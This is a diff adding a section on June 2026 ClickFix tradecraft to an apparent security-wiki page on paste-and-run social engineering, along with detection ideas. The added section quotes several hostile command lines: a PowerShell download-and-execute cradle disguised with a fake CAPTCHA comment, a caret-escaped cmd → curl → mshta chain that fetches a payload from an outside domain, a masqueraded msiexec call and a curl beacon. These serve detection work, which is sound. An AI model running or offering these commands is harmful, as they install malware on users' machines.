@@ -211,6 +211,46 @@ Detection/hunting tips for these variants
 - Network: outbound to CDN worker hosts or blockchain RPC endpoints from script hosts/PowerShell shortly after web browsing.
 - File/registry: temporary `.ps1` creation under `%TEMP%` plus RunMRU entries containing these one-liners; block/alert on signed-script LOLBAS (WScript/cscript/mshta) executing with external URLs or obfuscated alias strings.
 
+## June 2026 ClickFix tradecraft: paste telemetry, fake verification comments, and LOLBin chaining
+
+Recent Red Canary telemetry shows that the stable indicator is **not one exact command**, but the combination of **user-assisted paste-and-run**, **trusted interpreters/LOLBins**, **obfuscated flags**, **remote retrieval**, and **immediate execution**.
+
+### Notable operator patterns
+
+- **Paste confirmation telemetry**: some payloads call `curl -fsS -4 --connect-timeout 5 --max-time 10 -X POST ... /api/metrics/run?event=pasted` before the real stage. This confirms user interaction while keeping the window short and quiet.
+- **Fake verification comments**: PowerShell one-liners may append strings such as `# Security check ✔️ I'm not a robot Verification ID: 138105` so the command still looks CAPTCHA-related after it is pasted into Run / `cmd.exe` / PowerShell history.
+- **Dynamic URL reconstruction**: `iex(irm(('ccud'+'mcx')+('.x'+'yz/u')))` avoids a static URL in the command line while still performing in-memory download-and-execute.
+- **Masqueraded installer execution**: `"C:\WINDOWS\system32\msIeXec.exe" -PAcKᵃGE http://... /Q` abuses unusual casing and Unicode-like characters in flags to break brittle detections while still resembling `msiexec.exe`.
+- **Caret-escaped LOLBin chains**: `cmd.exe` can hide keywords with `^` escapes (`s^t^a^r^t`, `^c^u^r^l^`, `^m^s^h^t^a^`), start the nested shell minimized, save attacker content with a benign extension such as `.pdf`, and then execute it through `mshta`.
+
+### Example traits worth hunting
+
+```cmd
+"PowerShell.exe" "Write-Host(&{iex(irm(('ccud'+'mcx')+('.x'+'yz/u')))})2>$null" # Security check ✔️ I'm not a robot Verification ID: 138105
+```
+
+- Runtime-built URL fragments instead of a plain IOC.
+- `irm` + `iex` for direct memory execution.
+- `2>$null` or similar stderr suppression to hide failures from the user.
+- Social-engineering text embedded directly in the command line.
+
+```cmd
+"cmd.exe" /c s^t^a^r^t "" /min C:\windows\system32\cmd.exe /c "(for /f "delims=" %E in ('echo C:\Users\username\AppData\Local\Voter.pdf') do ^c^u^r^l^ -skLo "%E" 35613analytics[.]com/uuu && ^m^s^h^t^a^ "%E")"
+```
+
+- `/min` reduces visible shell artifacts.
+- `curl -skLo` downloads silently, ignores certificate problems, and writes to an attacker-chosen path.
+- The saved name/extension is not a trust signal: `mshta` will still execute HTA/script content from a file named `.pdf`.
+- This is a high-signal `cmd.exe` → `curl` → `mshta` proxy-execution chain for detections.
+
+### Extra detection ideas for these variants
+
+- Correlate **browser interaction or clipboard-write telemetry** with `explorer.exe` spawning `powershell.exe`, `cmd.exe`, `msiexec.exe`, or `mshta.exe` within seconds.
+- Flag command lines containing **verification-themed comments/strings** together with shell metacharacters, PowerShell cradles, or LOLBins.
+- Hunt for **unusual casing** of Windows binaries and for **Unicode/confusable characters** inside switches (for example `-PAcKᵃGE`).
+- Alert when `mshta.exe` opens files from **user-writable paths** with misleading extensions, or when `cmd.exe /min` immediately launches download-and-execute logic.
+- Treat `curl` POSTs with custom headers plus markers such as `event=pasted` as strong campaign telemetry rather than benign CLI usage.
+
 ## Mitigations
 
 1. Browser hardening – disable clipboard write-access (`dom.events.asyncClipboard.clipboardItem` etc.) or require user gesture.
@@ -234,5 +274,6 @@ Detection/hunting tips for these variants
 - [The ClickFix Factory: First Exposure of IUAM ClickFix Generator](https://unit42.paloaltonetworks.com/clickfix-generator-first-of-its-kind/)
 - [2025, the year of the Infostealer](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
 - [Red Canary – Intelligence Insights: February 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-february-2026/)
+- [Red Canary – Intelligence Insights: June 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-june-2026/)
 
 {{#include ../../banners/hacktricks-training.md}}
